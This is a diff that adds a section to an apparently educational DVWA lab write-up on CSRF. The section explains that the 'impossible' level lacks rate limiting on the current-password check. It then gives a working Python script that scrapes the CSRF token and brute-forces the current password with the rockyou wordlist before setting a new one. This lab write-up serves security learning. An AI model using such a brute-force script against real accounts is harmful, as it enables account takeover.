@@ -107,6 +107,82 @@ if (user_token):
     changePassword(user_token)
 ```
 
+## IMPOSSIBLE Security Level
+This level seems to impossible to exploit. However, there is a vulnerability: this level requires a new value which is `password_current` in order to check if the user know the current password before changing the new one.
+
+This seems to be secure however unlike the IMPOSSIBLE level of brute-force it will have several checks and also limit the errors. Therefore, in that IMPOSSIBLE brute-force it is kinda hard to brute-force the password. However, this IMPOSSIBLE level in CSRF doesn't check like that.
+
+=> We can brute-force the current password then change new one (even though we doesn't know the current password).
+
+This is my created Python exploit code:
+```python
+import requests
+import re
+
+baseUrl = "http://localhost/DVWA/vulnerabilities/csrf/"
+
+cookies = {
+    "PHPSESSID": "<YOUR_SESSS_ID>",
+    "security": "impossible"
+}
+
+pattern = r"name='user_token' value='([a-fA-F0-9]+)'"
+
+def getCSRFToken():
+    try:
+        # Take CSRF Token
+        res = requests.get(baseUrl, cookies=cookies)
+
+        match = re.search(pattern, res.text)
+        if match:
+            token = match.group(1)
+            
+            return token
+        else:
+            print("Failed to taken token")
+            return False
+    except requests.exceptions.RequestException as e:
+        print("Request error:", e)
+
+def changePassword():
+    newPassword = input('Enter new password: ')
+
+    headers = {
+        "Referer": "http://localhost/DVWA/vulnerabilities/csrf/"
+    }
+
+    try:    
+        with open('/usr/share/wordlists/rockyou.txt') as file:
+            for line in file:
+                password = line.rstrip()
+                
+                user_token = getCSRFToken()
+
+                if not user_token:
+                    print('Failed to fetch token')
+                    continue
+                
+
+                url = baseUrl + f"?password_current={password}&password_new={newPassword}&password_conf={newPassword}&Change=Change&user_token={user_token}"
+
+                try:
+                    print(f'Attempting {password}')
+                    res = requests.get(url, cookies=cookies, headers=headers)
+
+                    if "Password Changed" in res.text:
+                        print()
+                        print(f'Found current password: {password}')
+                        print('Successfully change password')
+                        exit()
+                except requests.exceptions.RequestException as e:
+                    print("Request error:", e)
+    except FileNotFoundError as e:
+        print("File not found:", e)
+
+changePassword()
+```
+
+
 ## Resources
 - https://owasp.org/www-community/attacks/csrf
 - https://www.cgisecurity.com/csrf-faq.html
